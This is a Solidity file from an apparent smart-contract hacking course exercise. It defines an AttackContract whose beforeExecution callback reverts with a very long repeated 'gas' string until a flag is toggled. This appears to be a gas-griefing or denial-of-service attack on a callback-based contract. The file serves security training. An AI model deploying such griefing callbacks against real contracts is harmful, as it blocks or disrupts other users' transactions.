// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../interfaces/ICallbackContract.sol";

contract AttackContract {
    bool canSwap;

    function beforeExecution() external view {
        if (canSwap) return;
        // TODO: Implement your malicious beforeExecution callback
        revert(
            "gasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgasgas"
        );
    }

    function setCanSwap(bool target) external {
        canSwap = target;
    }
}
